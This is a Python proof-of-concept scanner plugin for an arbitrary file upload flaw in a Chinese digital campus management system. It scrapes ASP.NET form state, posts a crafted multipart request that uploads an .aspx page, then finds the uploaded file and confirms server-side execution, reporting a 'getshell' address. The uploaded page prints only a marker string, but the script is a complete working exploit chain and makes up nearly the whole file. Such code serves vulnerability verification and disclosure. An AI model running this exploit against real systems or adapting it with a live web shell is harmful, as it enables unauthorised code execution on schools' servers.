# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'Goodo-edu_0006'  # 平台漏洞编号，留空
    name = '上海鼎创通用型数字校园系统 任意上传'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_UPLOAD  # 漏洞类型
    disclosure_date = '2015-04-29'  # 漏洞公布时间
    desc = '''
        上海鼎创通用型数字校园系统是由上海鼎创信息科技有限公司打造的校园数字一体化管理系统。
        上海鼎创通用型数字校园系统 任意上传导致Getshell
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0111072'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '上海鼎创通用型数字校园系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


def com_pack(state):
    if len(state) < 2:
        return ""
    else:
        return '''
POST /EduPlate/TradeUnionBlog/TradeUnionPhtoAdd.aspx HTTP/1.1
Host: i.goodo.com.cn
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:39.0) Gecko/20100101 Firefox/39.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://i.goodo.com.cn/EduPlate/TradeUnionBlog/TradeUnionPhtoAdd.aspx
Connection: keep-alive
Content-Type: multipart/form-data; boundary=---------------------------4031702637822542581177793002
Content-Length: 1073

-----------------------------4031702637822542581177793002
Content-Disposition: form-data; name="__EVENTTARGET"

lbnSubmit
-----------------------------4031702637822542581177793002
Content-Disposition: form-data; name="__EVENTARGUMENT"


-----------------------------4031702637822542581177793002
Content-Disposition: form-data; name="__VIEWSTATE"

''' + str(state[0]) + '''
-----------------------------4031702637822542581177793002
Content-Disposition: form-data; name="lbInfo"

6dd
-----------------------------4031702637822542581177793002
Content-Disposition: form-data; name="File1"; filename="codier.aspx"
Content-Type: application/octet-stream

<%@ Page Language="Jscript"%>
<%Response.Write('E327B894F7C7782B9A3CE3697556902A');%>
-----------------------------4031702637822542581177793002
Content-Disposition: form-data; name="__EVENTVALIDATION"

''' + str(state[1]) + '''
-----------------------------4031702637822542581177793002--
'''


def getViewState(url):
    hh = hackhttp.hackhttp()
    code, head, res, errcode, _ = hh.http(
        url + '/EduPlate/TradeUnionBlog/TradeUnionPhtoAdd.aspx')
    if code == 200:
        the_list = []
        buff_list = re.findall(
            '<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="(.*?)" />', res)
        if buff_list:
            the_list.append(buff_list[0])
        buff_list = re.findall(
            '<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="(.*?)" />', res)
        if buff_list:
            the_list.append(buff_list[0])
        return the_list


class Poc(ABPoc):
    poc_id = '00e35f85-ad1c-4aff-9782-8934610887cc'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            # from:http://www.wooyun.org/bugs/wooyun-2015-0111072
            url = self.target
            buff_state = getViewState(url)  # get viewstat
            rawt = com_pack(buff_state)  # get pack
            code, head, res, errcode, _ = hh.http(
                url + '/EduPlate/TradeUnionBlog/TradeUnionPhtoAdd.aspx', raw=rawt)
            m = re.search(
                '(\xcc\xe1\xbd\xbb\xb3\xc9\xb9\xa6\xa3\xa1|\xe6\x8f\x90\xe4\xba\xa4\xe6\x88\x90\xe5\x8a\x9f\xef\xbc\x81)', res)
            if m:
                #security_info('[upload success] ' + url + '/EduPlate/TradeUnionBlog/TradeUnionPhtoAdd.aspx')
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            url = self.target
            buff_state = getViewState(url)  # get viewstat
            rawt = com_pack(buff_state)  # get pack
            code, head, res, errcode, _ = hh.http(
                url + '/EduPlate/TradeUnionBlog/TradeUnionPhtoAdd.aspx', raw=rawt)
            m = re.search(
                '(\xcc\xe1\xbd\xbb\xb3\xc9\xb9\xa6\xa3\xa1|\xe6\x8f\x90\xe4\xba\xa4\xe6\x88\x90\xe5\x8a\x9f\xef\xbc\x81)', res)
            if m:
                print(('[upload success] ' + url +
                       '/EduPlate/TradeUnionBlog/TradeUnionPhtoAdd.aspx'))

            code, head, res, errcode, _ = hh.http(
                url + '/EduPlate/TradeUnionBlog/TradeUnionPhtoAll.aspx')
            m = re.search(r"src='\.\./\.\./(.*?)'", res)
            if m:
                code, head, res, errcode, _ = hh.http(url + '/' + m.group(1))
                if 'E327B894F7C7782B9A3CE3697556902A' in res:
                    #security_hole('[getshell success] ' + url + '/' + m.group(1))
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞，getshell地址：{url}/{m}'.format(
                        target=self.target, name=self.vuln.name, url=self.target, m=m.group(1)))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
